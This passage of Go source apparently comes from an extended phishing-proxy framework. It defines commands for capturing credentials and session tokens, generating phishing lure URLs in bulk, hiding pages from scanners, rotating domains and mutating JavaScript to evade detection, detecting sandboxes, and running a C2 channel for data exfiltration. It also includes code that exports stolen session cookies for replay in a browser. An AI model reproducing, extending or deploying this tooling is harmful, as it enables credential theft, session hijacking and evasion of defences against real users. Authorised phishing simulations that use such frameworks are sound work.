	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
	h.AddSubCommand("phishlets", []string{"unauth_url"}, "unauth_url <phishlet> <url>", "override global unauth_url just for this phishlet")
	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")

	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")

	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
			readline.PcItem("delete", readline.PcItem("all"))))

	h.AddSubCommand("lures", nil, "", "show all create lures")
	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
	h.AddSubCommand("lures", []string{"create"}, "create <phishlet>", "creates new lure for given <phishlet>")
	h.AddSubCommand("lures", []string{"delete"}, "delete <id>", "deletes lure with given <id>")
	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> import <params_file> export <urls_file> <text|csv|json>", "generates phishing urls, importing parameters from <import_path> file and exporting them to <export_path>")
	h.AddSubCommand("lures", []string{"pause"}, "pause <id> <1d2h3m4s>", "pause lure <id> for specific amount of time and redirect visitors to `unauth_url`")
	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "path"}, "edit <id> path <path>", "sets custom url <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "redirector"}, "edit <id> redirector <path>", "sets an html redirector directory <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "ua_filter"}, "edit <id> ua_filter <regexp>", "sets a regular expression user-agent whitelist filter <regexp> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "redirect_url"}, "edit <id> redirect_url <redirect_url>", "sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "phishlet"}, "edit <id> phishlet <phishlet>", "change the phishlet, the lure with a given <id> applies to")
	h.AddSubCommand("lures", []string{"edit", "info"}, "edit <id> info <info>", "set personal information to describe a lure with a given <id> (display only)")
	h.AddSubCommand("lures", []string{"edit", "og_title"}, "edit <id> og_title <title>", "sets opengraph title that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_desc"}, "edit <id> og_des <title>", "sets opengraph description that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")

	h.AddCommand("cloudflare", "general", "manage Cloudflare Worker scripts", "Generate and deploy Cloudflare Worker scripts for redirectors.", LAYER_TOP,
		readline.PcItem("cloudflare", 
			readline.PcItem("worker", readline.PcItem("simple"), readline.PcItem("html"), readline.PcItem("advanced")),
			readline.PcItem("deploy"),
			readline.PcItem("list"),
			readline.PcItem("delete"),
			readline.PcItem("update"),
			readline.PcItem("status"),
			readline.PcItem("config")))
	h.AddSubCommand("cloudflare", []string{"worker"}, "worker <type> <redirect_url> [options]", "generate a Cloudflare Worker script")
	h.AddSubCommand("cloudflare", []string{"worker", "simple"}, "worker simple <redirect_url>", "generate a simple redirect Worker")
	h.AddSubCommand("cloudflare", []string{"worker", "html"}, "worker html <redirect_url>", "generate an HTML redirector Worker")
	h.AddSubCommand("cloudflare", []string{"worker", "advanced"}, "worker advanced <redirect_url>", "generate an advanced Worker with filtering")
	h.AddSubCommand("cloudflare", []string{"deploy"}, "deploy <worker_name> <type> <redirect_url> [options]", "deploy a Worker to Cloudflare")
	h.AddSubCommand("cloudflare", []string{"list"}, "list", "list all deployed Workers")
	h.AddSubCommand("cloudflare", []string{"delete"}, "delete <worker_name>", "delete a deployed Worker")
	h.AddSubCommand("cloudflare", []string{"update"}, "update <worker_name> <redirect_url>", "update a Worker's redirect URL")
	h.AddSubCommand("cloudflare", []string{"status"}, "status <worker_name>", "check a Worker's deployment status")
	h.AddSubCommand("cloudflare", []string{"config"}, "config", "show Cloudflare Worker configuration")

	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))

	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
	h.AddSubCommand("blacklist", []string{"unauth"}, "unauth", "block and blacklist ip addresses only for unauthorized requests")
	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")

	h.AddCommand("whitelist", "general", "manage IP whitelist to allow only specific IP addresses", "When enabled, only IP addresses in the whitelist will be allowed to access the phishing infrastructure.", LAYER_TOP,
		readline.PcItem("whitelist", readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("list"), readline.PcItem("clear"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))

	h.AddSubCommand("whitelist", nil, "", "show current whitelist status and statistics")
	h.AddSubCommand("whitelist", []string{"on"}, "on", "enable IP whitelisting (only whitelisted IPs can access)")
	h.AddSubCommand("whitelist", []string{"off"}, "off", "disable IP whitelisting (all IPs allowed, subject to blacklist)")
	h.AddSubCommand("whitelist", []string{"add"}, "add <ip_address>", "add an IP address or CIDR range to the whitelist")
	h.AddSubCommand("whitelist", []string{"remove"}, "remove <ip_address>", "remove an IP address from the whitelist")
	h.AddSubCommand("whitelist", []string{"list"}, "list", "list all whitelisted IP addresses")
	h.AddSubCommand("whitelist", []string{"clear"}, "clear", "remove all IP addresses from the whitelist")
	h.AddSubCommand("whitelist", []string{"log"}, "log <on|off>", "enable or disable log output for whitelist messages")

	h.AddCommand("ja3", "general", "manage JA3/JA3S TLS fingerprinting", "Shows JA3 fingerprinting statistics and manage custom bot signatures.", LAYER_TOP,
		readline.PcItem("ja3", readline.PcItem("stats"), readline.PcItem("signatures"), readline.PcItem("add"), readline.PcItem("export")))
		
	h.AddSubCommand("ja3", nil, "", "show JA3 fingerprinting statistics")
	h.AddSubCommand("ja3", []string{"stats"}, "stats", "show detailed JA3 fingerprinting statistics")
	h.AddSubCommand("ja3", []string{"signatures"}, "signatures", "list all known bot JA3 signatures")
	h.AddSubCommand("ja3", []string{"add"}, "add <name> <ja3_hash> <description>", "add custom bot JA3 signature")
	h.AddSubCommand("ja3", []string{"export"}, "export", "export bot JA3 signatures to JSON")

	h.AddCommand("captcha", "general", "manage CAPTCHA protection", "Configure and manage multiple CAPTCHA providers for bot protection.", LAYER_TOP,
		readline.PcItem("captcha", 
			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("provider", readline.PcItem("recaptcha_v2"), readline.PcItem("recaptcha_v3"), readline.PcItem("hcaptcha"), readline.PcItem("turnstile")),
			readline.PcItem("configure"),
			readline.PcItem("require", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("test")))
	
	h.AddSubCommand("captcha", nil, "", "show CAPTCHA configuration and statistics")
	h.AddSubCommand("captcha", []string{"enable"}, "enable <on|off>", "enable or disable CAPTCHA protection")
	h.AddSubCommand("captcha", []string{"provider"}, "provider <name>", "set active CAPTCHA provider")
	h.AddSubCommand("captcha", []string{"configure"}, "configure <provider> <site_key> <secret_key> [options]", "configure a CAPTCHA provider")
	h.AddSubCommand("captcha", []string{"require"}, "require <on|off>", "require CAPTCHA verification for all lures")
	h.AddSubCommand("captcha", []string{"test"}, "test", "open test page to verify CAPTCHA configuration")

	h.AddCommand("domain-rotation", "general", "manage automatic domain rotation", "Configure and manage automatic domain rotation system for avoiding detection.", LAYER_TOP,
		readline.PcItem("domain-rotation",
			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("strategy", readline.PcItem("round-robin"), readline.PcItem("weighted"), readline.PcItem("health-based"), readline.PcItem("random")),
			readline.PcItem("interval"),
			readline.PcItem("max-domains"),
			readline.PcItem("auto-generate", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("add-domain"),
			readline.PcItem("remove-domain"),
			readline.PcItem("list"),
			readline.PcItem("add-provider"),
			readline.PcItem("mark-compromised"),
			readline.PcItem("stats")))
			
	h.AddSubCommand("domain-rotation", nil, "", "show domain rotation configuration and statistics")
	h.AddSubCommand("domain-rotation", []string{"enable"}, "enable <on|off>", "enable or disable domain rotation")
	h.AddSubCommand("domain-rotation", []string{"strategy"}, "strategy <type>", "set rotation strategy (round-robin, weighted, health-based, random)")
	h.AddSubCommand("domain-rotation", []string{"interval"}, "interval <minutes>", "set rotation interval in minutes")
	h.AddSubCommand("domain-rotation", []string{"max-domains"}, "max-domains <count>", "set maximum number of domains in rotation pool")
	h.AddSubCommand("domain-rotation", []string{"auto-generate"}, "auto-generate <on|off>", "enable automatic domain generation")
	h.AddSubCommand("domain-rotation", []string{"add-domain"}, "add-domain <domain> <subdomain> <provider>", "add domain to rotation pool")
	h.AddSubCommand("domain-rotation", []string{"remove-domain"}, "remove-domain <full_domain>", "remove domain from rotation pool")
	h.AddSubCommand("domain-rotation", []string{"list"}, "list", "list all domains in rotation pool")
	h.AddSubCommand("domain-rotation", []string{"add-provider"}, "add-provider <name> <type> <api_key> <api_secret> <zone>", "add DNS provider")
	h.AddSubCommand("domain-rotation", []string{"mark-compromised"}, "mark-compromised <full_domain> <reason>", "mark domain as compromised")
	h.AddSubCommand("domain-rotation", []string{"stats"}, "stats", "show detailed domain rotation statistics")

	h.AddCommand("traffic-shaping", "general", "manage intelligent traffic shaping and rate limiting", "Configure adaptive rate limiting, DDoS protection, and bandwidth management.", LAYER_TOP,
		readline.PcItem("traffic-shaping",
			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("mode", readline.PcItem("adaptive"), readline.PcItem("strict"), readline.PcItem("learning")),
			readline.PcItem("global-limit"),
			readline.PcItem("ip-limit"),
			readline.PcItem("bandwidth-limit"),
			readline.PcItem("geo-rule"),
			readline.PcItem("stats")))
			
	h.AddSubCommand("traffic-shaping", nil, "", "show traffic shaping configuration and statistics")
	h.AddSubCommand("traffic-shaping", []string{"enable"}, "enable <on|off>", "enable or disable traffic shaping")
	h.AddSubCommand("traffic-shaping", []string{"mode"}, "mode <adaptive|strict|learning>", "set traffic shaping mode")
	h.AddSubCommand("traffic-shaping", []string{"global-limit"}, "global-limit <rate> <burst>", "set global rate limit (requests/sec)")
	h.AddSubCommand("traffic-shaping", []string{"ip-limit"}, "ip-limit <rate> <burst>", "set per-IP rate limit (requests/sec)")
	h.AddSubCommand("traffic-shaping", []string{"bandwidth-limit"}, "bandwidth-limit <bytes/sec>", "set bandwidth limit")
	h.AddSubCommand("traffic-shaping", []string{"geo-rule"}, "geo-rule <country> <rate> <burst> <priority> <block>", "configure geographic rule")
	h.AddSubCommand("traffic-shaping", []string{"stats"}, "stats", "show detailed traffic shaping statistics")

	h.AddCommand("sandbox", "general", "manage sandbox and VM detection", "Configure sandbox/VM detection and evasion settings.", LAYER_TOP,
		readline.PcItem("sandbox",
			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("mode", readline.PcItem("passive"), readline.PcItem("active"), readline.PcItem("aggressive")),
			readline.PcItem("threshold"),
			readline.PcItem("action", readline.PcItem("block"), readline.PcItem("redirect"), readline.PcItem("honeypot")),
			readline.PcItem("redirect"),
			readline.PcItem("honeypot"),
			readline.PcItem("stats")))
			
	h.AddSubCommand("sandbox", nil, "", "show sandbox detection configuration")
	h.AddSubCommand("sandbox", []string{"enable"}, "enable <on|off>", "enable or disable sandbox detection")
	h.AddSubCommand("sandbox", []string{"mode"}, "mode <passive|active|aggressive>", "set detection mode")
	h.AddSubCommand("sandbox", []string{"threshold"}, "threshold <0.0-1.0>", "set detection confidence threshold")
	h.AddSubCommand("sandbox", []string{"action"}, "action <block|redirect|honeypot>", "set action on detection")
	h.AddSubCommand("sandbox", []string{"redirect"}, "redirect <url>", "set redirect URL for detected sandboxes")
	h.AddSubCommand("sandbox", []string{"honeypot"}, "honeypot <html>", "set honeypot response HTML")
	h.AddSubCommand("sandbox", []string{"stats"}, "stats", "show sandbox detection statistics")

	h.AddCommand("c2", "general", "manage command and control channel", "Configure encrypted C2 communications for data exfiltration and remote control.", LAYER_TOP,
		readline.PcItem("c2",
			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("transport", readline.PcItem("https"), readline.PcItem("dns")),
			readline.PcItem("server", readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("list")),
			readline.PcItem("key", readline.PcItem("generate"), readline.PcItem("import"), readline.PcItem("export")),
			readline.PcItem("auth"),
			readline.PcItem("test"),
			readline.PcItem("status")))
			
	h.AddSubCommand("c2", nil, "", "show C2 channel configuration and status")
	h.AddSubCommand("c2", []string{"enable"}, "enable <on|off>", "enable or disable C2 channel")
	h.AddSubCommand("c2", []string{"transport"}, "transport <https|dns>", "set C2 transport method")
	h.AddSubCommand("c2", []string{"server", "add"}, "server add <id> <url> <priority>", "add C2 server")
	h.AddSubCommand("c2", []string{"server", "remove"}, "server remove <id>", "remove C2 server")
	h.AddSubCommand("c2", []string{"server", "list"}, "server list", "list all C2 servers")
	h.AddSubCommand("c2", []string{"key", "generate"}, "key generate", "generate new encryption key")
	h.AddSubCommand("c2", []string{"key", "import"}, "key import <base64_key>", "import encryption key")
	h.AddSubCommand("c2", []string{"key", "export"}, "key export", "export encryption key")
	h.AddSubCommand("c2", []string{"auth"}, "auth <token>", "set authentication token")
	h.AddSubCommand("c2", []string{"test"}, "test", "test C2 connection")
	h.AddSubCommand("c2", []string{"status"}, "status", "show C2 channel statistics")

	h.AddCommand("polymorphic", "general", "manage polymorphic JavaScript engine", "Configure dynamic JavaScript mutation for signature evasion.", LAYER_TOP,
		readline.PcItem("polymorphic",
			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("level", readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high"), readline.PcItem("extreme")),
			readline.PcItem("cache", readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("clear")),
			readline.PcItem("seed-rotation"),
			readline.PcItem("template-mode", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("mutation", readline.PcItem("variables"), readline.PcItem("functions"), readline.PcItem("deadcode"), 
				readline.PcItem("controlflow"), readline.PcItem("strings"), readline.PcItem("math"), 
				readline.PcItem("comments"), readline.PcItem("whitespace")),
			readline.PcItem("test"),
			readline.PcItem("stats")))
			
	h.AddSubCommand("polymorphic", nil, "", "show polymorphic engine configuration")
	h.AddSubCommand("polymorphic", []string{"enable"}, "enable <on|off>", "enable or disable polymorphic engine")
	h.AddSubCommand("polymorphic", []string{"level"}, "level <low|medium|high|extreme>", "set mutation level")
	h.AddSubCommand("polymorphic", []string{"cache"}, "cache <on|off|clear>", "manage mutation cache")
	h.AddSubCommand("polymorphic", []string{"seed-rotation"}, "seed-rotation <minutes>", "set seed rotation interval")
	h.AddSubCommand("polymorphic", []string{"template-mode"}, "template-mode <on|off>", "enable template-based mutations")
	h.AddSubCommand("polymorphic", []string{"mutation"}, "mutation <type> <on|off>", "toggle specific mutation types")
	h.AddSubCommand("polymorphic", []string{"test"}, "test [code]", "test polymorphic mutations")
	h.AddSubCommand("polymorphic", []string{"stats"}, "stats", "show polymorphic engine statistics")

	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
		readline.PcItem("test-certs"))

	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
		readline.PcItem("clear"))

	t.hlp = h
}

func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		Session        bool   `json:"session"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
				Session:        false,
			}
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			if domain[:1] == "." {
				c.HostOnly = false
				// c.Domain = domain[1:] - bug support no longer needed
				// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
				// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func (t *Terminal) tokensToJSON(tokens map[string]string) string {
	var ret string
	white := color.New(color.FgHiWhite)
	for k, v := range tokens {
		ret += fmt.Sprintf("%s: %s\n", k, white.Sprint(v))
	}
	return ret
}

func (t *Terminal) checkStatus() {
	if t.cfg.GetBaseDomain() == "" {
		log.Warning("server domain not set! type: config domain <domain>")
	}
	if t.cfg.GetServerExternalIP() == "" {
		log.Warning("server external ip not set! type: config ipv4 external <external_ipv4_address>")
	}
}

func (t *Terminal) manageCertificates(verbose bool) {
	if !t.p.developer {
		if t.cfg.IsAutocertEnabled() {
			hosts := t.p.cfg.GetActiveHostnames("")
			//wc_host := t.p.cfg.GetWildcardHostname()
			//hosts := []string{wc_host}
			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
			if verbose {
				log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
			}
			err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
			if err != nil {
				log.Error("failed to set up TLS certificates: %s", err)
				log.Error("run 'test-certs' command to retry")
				return
			}
			if verbose {
				log.Info("successfully set up all TLS certificates")
			}
		} else {
			err := t.p.crt_db.setUnmanagedSync(verbose)
			if err != nil {
				log.Error("failed to set up TLS certificates: %s", err)
				log.Error("run 'test-certs' command to retry")
				return
			}
		}
	}
}

func (t *Terminal) sprintPhishletStatus(site string) string {
	higreen := color.New(color.FgHiGreen)
	logreen := color.New(color.FgGreen)
	hiblue := color.New(color.FgHiBlue)
	blue := color.New(color.FgBlue)
	cyan := color.New(color.FgHiCyan)
	yellow := color.New(color.FgYellow)
	higray := color.New(color.FgWhite)
	logray := color.New(color.FgHiBlack)
	n := 0
	cols := []string{"phishlet", "status", "visibility", "hostname", "unauth_url"}
	var rows [][]string

	var pnames []string
	for s := range t.cfg.phishlets {
		pnames = append(pnames, s)
	}
	sort.Strings(pnames)

	for _, s := range pnames {
		pl := t.cfg.phishlets[s]
		if site == "" || s == site {
			_, err := t.cfg.GetPhishlet(s)
			if err != nil {
				continue
			}

			status := logray.Sprint("disabled")
			if pl.isTemplate {
				status = yellow.Sprint("template")
			} else if t.cfg.IsSiteEnabled(s) {
				status = higreen.Sprint("enabled")
			}
			hidden_status := higray.Sprint("visible")
			if t.cfg.IsSiteHidden(s) {
				hidden_status = logray.Sprint("hidden")
			}
			domain, _ := t.cfg.GetSiteDomain(s)
			unauth_url, _ := t.cfg.GetSiteUnauthUrl(s)
			n += 1

			if s == site {
				var param_names string
				for k, v := range pl.customParams {
					if len(param_names) > 0 {
						param_names += "; "
					}
					param_names += k
					if v != "" {
						param_names += ": " + v
					}
				}

				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "unauth_url", "params"}
				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logray.Sprint(param_names)}
				return AsRows(keys, vals)
			} else if site == "" {
				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url)})
			}
		}
	}
	return AsTable(cols, rows)
}

func (t *Terminal) sprintIsEnabled(enabled bool) string {
	logray := color.New(color.FgHiBlack)
	normal := color.New(color.Reset)

	if enabled {
		return normal.Sprint("true")
	} else {
		return logray.Sprint("false")
	}
}

func (t *Terminal) sprintLures() string {
	higreen := color.New(color.FgHiGreen)
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	cyan := color.New(color.FgCyan)
	hcyan := color.New(color.FgHiCyan)
	white := color.New(color.FgHiWhite)
	//n := 0
	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "redirect_url", "paused", "og"}
	var rows [][]string
	for n, l := range t.cfg.lures {
		var og string
		if l.OgTitle != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgDescription != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgImageUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}

		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), s_paused, og})
	}
	return AsTable(cols, rows)
}

func (t *Terminal) phishletPrefixCompleter(args string) []string {
	return t.cfg.GetPhishletNames()
}

func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
	dir := t.cfg.GetRedirectorsDir()

	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return []string{}
	}
	var ret []string
	for _, f := range files {
		if f.IsDir() {
			index_path1 := filepath.Join(dir, f.Name(), "index.html")
			index_path2 := filepath.Join(dir, f.Name(), "index.htm")
			index_found := ""
			if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
				index_found = index_path1
			} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
				index_found = index_path2
			}
			if index_found != "" {
				name := f.Name()
				if strings.Contains(name, " ") {
					name = "\"" + name + "\""
				}
				ret = append(ret, name)
			}
		}
	}
	return ret
}

func (t *Terminal) luresIdPrefixCompleter(args string) []string {
	var ret []string
	for n := range t.cfg.lures {
		ret = append(ret, strconv.Itoa(n))
	}
	return ret
}

func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
	var ret []string
	var ret_params []map[string]string

	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
	if err != nil {
		return ret, ret_params, err
	}
	defer f.Close()

	var format string = "text"
	if filepath.Ext(path) == ".csv" {
		format = "csv"
	} else if filepath.Ext(path) == ".json" {
		format = "json"
	}

	log.Info("importing parameters file as: %s", format)

	switch format {
	case "text":
		fs := bufio.NewScanner(f)
		fs.Split(bufio.ScanLines)

		n := 0
		for fs.Scan() {
			n += 1
			l := fs.Text()
			// remove comments
			if n := strings.Index(l, ";"); n > -1 {
				l = l[:n]
			}
			l = strings.Trim(l, " ")

			if len(l) > 0 {
				args, err := parser.Parse(l)
				if err != nil {
					log.Error("syntax error at line %d: [%s] %v", n, l, err)
					continue
				}

				params := url.Values{}
				map_params := make(map[string]string)
				for _, val := range args {
					sp := strings.Index(val, "=")
					if sp == -1 {
						log.Error("invalid parameter syntax at line %d: [%s]", n, val)
						continue
					}
					k := val[:sp]
					v := val[sp+1:]

					params.Add(k, v)
					map_params[k] = v
				}

				if len(params) > 0 {
					ret = append(ret, t.createPhishUrl(base_url, &params))
					ret_params = append(ret_params, map_params)
				}
			}
		}
	case "csv":
		r := csv.NewReader(bufio.NewReader(f))

		param_names, err := r.Read()
		if err != nil {
			return ret, ret_params, err
		}

		var params []string
		for params, err = r.Read(); err == nil; params, err = r.Read() {
			if len(params) != len(param_names) {
				log.Error("number of csv values do not match number of keys: %v", params)
				continue
			}

			item := url.Values{}
			map_params := make(map[string]string)
			for n, param := range params {
				item.Add(param_names[n], param)
				map_params[param_names[n]] = param
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}
		if err != io.EOF {
			return ret, ret_params, err
		}
	case "json":
		data, err := ioutil.ReadAll(bufio.NewReader(f))
		if err != nil {
			return ret, ret_params, err
		}

		var params_json []map[string]interface{}

		err = json.Unmarshal(data, &params_json)
		if err != nil {
			return ret, ret_params, err
		}

		for _, json_params := range params_json {
			item := url.Values{}
			map_params := make(map[string]string)
			for k, v := range json_params {
				if val, ok := v.(string); ok {
					item.Add(k, val)
					map_params[k] = val
				} else {
					log.Error("json parameter '%s' value must be of type string", k)
				}
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}

		/*
			r := json.NewDecoder(bufio.NewReader(f))

			t, err := r.Token()
			if err != nil {
				return ret, ret_params, err
			}
			if s, ok := t.(string); ok && s == "[" {
				for r.More() {
					t, err := r.Token()
					if err != nil {
						return ret, ret_params, err
					}

					if s, ok := t.(string); ok && s == "{" {
						for r.More() {
							t, err := r.Token()
							if err != nil {
								return ret, ret_params, err
							}


						}
					}
				}
			} else {
				return ret, ret_params, fmt.Errorf("array of parameters not found")
			}*/
	}
	return ret, ret_params, nil
}

func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phish_params []map[string]string, format string) error {
	if len(phish_urls) != len(phish_params) {
		return fmt.Errorf("phishing urls and phishing parameters count do not match")
	}
	if !stringExists(format, []string{"text", "csv", "json"}) {
		return fmt.Errorf("export format can only be 'text', 'csv' or 'json'")
	}

	f, err := os.OpenFile(export_path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	if format == "text" {
		for n, phish_url := range phish_urls {
			var params string
			m := 0
			params_row := phish_params[n]
			for k, v := range params_row {
				if m > 0 {
					params += " "
				}
				params += fmt.Sprintf("%s=\"%s\"", k, v)
				m += 1
			}

			_, err := f.WriteString(phish_url + " ; " + params + "\n")
			if err != nil {
				return err
			}
		}
	} else if format == "csv" {
		var data [][]string

		w := csv.NewWriter(bufio.NewWriter(f))

		var cols []string
		var param_names []string
		cols = append(cols, "url")
		for _, params_row := range phish_params {
			for k := range params_row {
				if !stringExists(k, param_names) {
					cols = append(cols, k)
					param_names = append(param_names, k)
				}
			}
		}
		data = append(data, cols)

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			var vals []string
			vals = append(vals, phish_url)

			for _, k := range param_names {
				vals = append(vals, params[k])
			}

			data = append(data, vals)
		}

		err := w.WriteAll(data)
		if err != nil {
			return err
		}
	} else if format == "json" {
		type UrlItem struct {
			PhishUrl string            `json:"url"`
			Params   map[string]string `json:"params"`
		}

		var items []UrlItem

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			item := UrlItem{
				PhishUrl: phish_url,
				Params:   params,
			}

			items = append(items, item)
		}

		data, err := json.MarshalIndent(items, "", "\t")
		if err != nil {
			return err
		}

